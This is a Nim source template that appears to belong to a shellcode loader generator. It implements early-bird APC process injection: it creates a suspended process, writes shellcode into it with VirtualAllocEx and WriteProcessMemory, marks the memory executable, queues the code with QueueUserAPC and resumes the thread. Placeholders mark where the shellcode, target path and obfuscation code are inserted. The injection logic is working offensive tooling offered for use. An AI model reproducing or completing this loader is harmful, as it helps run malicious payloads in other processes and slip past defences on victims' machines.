# DO NOT CARE ABOUT THE ERRORS HERE, THIS IS JUST A SKELETON
# NOTE: You gotta change the variable names here if you make a change to `config.json` (unless I remake this part as a string
# in a python script and change them with fstrings)

import winim
import std/base64   # Base64
import std/strutils
import std/sequtils
import nimAES, unittest       # AES-CBC

# Adding the below line so obfuscators can inject their codes; comment because it never gets deleted and we want the compiler to ignore it.
# DEOBFUSCATION_FUNCTION_INJECTED_HERE

proc injectQueueUserAPC[I, T](shellcode: array[I, T]): void =

    var
        ps: SECURITY_ATTRIBUTES
        ts: SECURITY_ATTRIBUTES
        si: STARTUPINFOEX
        pi: PROCESS_INFORMATION
        res: WINBOOL
        pHandle: HANDLE
        tHandle: HANDLE

    ps.nLength = sizeof(ps).cint
    ts.nLength = sizeof(ts).cint
    si.StartupInfo.cb = sizeof(si).cint

    res = CreateProcess(
        NULL,
        #newWideCString(r"C:\Program Files\Internet Explorer\iexplore.exe"),
        newWideCString(r"APPLICATION_PATH_INJECTED_HERE"),
        ps,
        ts,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT or CREATE_SUSPENDED,
        NULL,
        NULL,
        addr si.StartupInfo,
        addr pi
    )

    pHandle = pi.hProcess
    tHandle = pi.hThread

    let baseAddr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_READWRITE
    )

    var bytesWritten: SIZE_T

    let wSuccess = WriteProcessMemory(
        pHandle,
        baseAddr,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr bytesWritten
    )

    var prevPro: DWORD = 0

    let virPro = VirtualProtectEx(
        pHandle,
        baseAddr,
        cast[SIZE_T](shellcode.len),
        PAGE_EXECUTE_READ,
        addr prevPro
    )

    var success: DWORD = 0

    success = QueueUserAPC(
        cast[PAPCFUNC](baseAddr),
        tHandle,
        0
    )
    success = ResumeThread(tHandle)

    CloseHandle(tHandle)
    CloseHandle(pHandle)

var sc: string = "SHELLCODE_INJECTED_HERE"
var sc_seq: seq[byte]


# Adding the below line so obfuscators can inject their codes; comment because it never gets deleted and we want the compiler to ignore it.
# DEOBFUSCATION_CODE_INJECTED_HERE

sc_seq = sc.split(',')
    .map(proc (x: string): string = x.strip()) 
    .map(parseHexInt)
    .map(proc (x: int): byte = byte x)

var shellcode: array[SIZE_INJECTED_HERE, byte]
for s in 0..<SIZE_INJECTED_HERE:
    shellcode[s] = byte sc_seq[s]

when isMainModule:
    # Add DLL code if user wants a dll 
    # DLL_CODE

    # Add regular binary code if user wants a regular binary
    # REGULAR_BINARY_CODE
